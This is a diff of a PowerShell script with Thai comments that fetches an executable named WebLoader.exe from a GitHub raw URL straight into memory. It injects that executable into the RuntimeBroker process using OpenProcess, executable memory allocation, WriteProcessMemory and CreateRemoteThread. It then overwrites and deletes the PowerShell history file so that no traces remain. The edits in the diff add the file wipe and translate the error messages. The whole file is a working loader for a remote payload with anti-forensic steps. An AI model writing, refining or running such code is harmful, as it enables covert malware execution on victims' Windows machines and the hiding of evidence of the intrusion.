@@ -1,9 +1,9 @@
-# --- 1. เตรียมค่ากำหนด ---
+# --- 1. ตั้งค่าพื้นฐาน ---
 $url = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"
 $targetName = "RuntimeBroker"
 
-# นิยาม Win32 API โดยใช้ Full Type Name เพื่อป้องกัน Error [uint]
-$Win32Definitions = @"
+# นิยาม Win32 API โดยใช้ Type เต็มรูปแบบของ .NET (ป้องกัน Error [uint])
+$Signature = @"
 using System;
 using System.Runtime.InteropServices;
 
@@ -23,30 +23,31 @@ public class Win32 {
 "@
 
 try {
-    # โหลด Definition เข้าสู่ระบบ
-    Add-Type -TypeDefinition $Win32Definitions -ErrorAction SilentlyContinue
+    # โหลด Definition (ใช้ ErrorAction เพื่อไม่ให้แจ้งเตือนหากโหลดซ้ำ)
+    Add-Type -TypeDefinition $Signature -ErrorAction SilentlyContinue
 
     Write-Host "[*] Downloading C++ Payload to RAM..." -ForegroundColor Cyan
     $wc = New-Object System.Net.WebClient
     $exeBytes = $wc.DownloadData($url)
 
-    # 2. ค้นหา RuntimeBroker
+    # 2. ค้นหา Process เป้าหมาย
     $proc = Get-Process -Name $targetName -ErrorAction SilentlyContinue | Select-Object -First 1
-    if ($null -eq $proc) { throw "Target $targetName not found." }
+    if ($null -eq $proc) { throw "ไม่พบ Process $targetName ในระบบ" }
 
-    # 3. เปิด Process (PROCESS_ALL_ACCESS = 0x1F0FFF)
+    # 3. เปิดสิทธิ์การเข้าถึง Process (0x1F0FFF = PROCESS_ALL_ACCESS)
     $hProc = [Win32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
-    if ($hProc -eq [IntPtr]::Zero) { throw "Failed to open target process." }
+    if ($hProc -eq [IntPtr]::Zero) { throw "เข้าถึง Process ไม่ได้ (กรุณารันในฐานะ Admin)" }
 
-    # 4. จองพื้นที่ใน RAM (MEM_COMMIT | MEM_RESERVE = 0x3000, PAGE_EXECUTE_READWRITE = 0x40)
+    # 4. จองพื้นที่หน่วยความจำใน Process เป้าหมาย
+    # 0x3000 = MEM_COMMIT | MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE
     $remoteMem = [Win32]::VirtualAllocEx($hProc, [IntPtr]::Zero, [uint]$exeBytes.Length, 0x3000, 0x40)
-    if ($remoteMem -eq [IntPtr]::Zero) { throw "Memory allocation failed." }
+    if ($remoteMem -eq [IntPtr]::Zero) { throw "ไม่สามารถจองหน่วยความจำได้" }
 
-    # 5. เขียน Code ลงไปใน RAM ของเป้าหมาย
+    # 5. เขียน Code เข้าไปใน RAM ของเป้าหมาย
     $written = 0
     $success = [Win32]::WriteProcessMemory($hProc, $remoteMem, $exeBytes, [uint]$exeBytes.Length, [ref]$written)
 
-    # 6. สั่ง Execute
+    # 6. สั่ง Execute ผ่าน Remote Thread
     if ($success) {
         Write-Host "[*] Successfully injected into $($targetName) (PID: $($proc.Id))" -ForegroundColor Green
         [Win32]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $remoteMem, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
@@ -58,8 +59,13 @@ try {
     # --- 7. ลบประวัติร่องรอยทั้งหมด ---
     Write-Host "[*] Cleaning up traces..." -ForegroundColor Magenta
     $history = (Get-PSReadlineOption).HistorySavePath
-    if (Test-Path $history) { Clear-Content $history }
+    if (Test-Path $history) { 
+        # เขียนทับประวัติด้วยค่าว่างก่อนลบ
+        "" | Out-File $history 
+        Remove-Item $history -Force -ErrorAction SilentlyContinue
+    }
     Clear-History
-    # ปิดหน้าต่างทันทีเพื่อความปลอดภัย
+    
+    # ปิด Session ทันที
     exit
 }
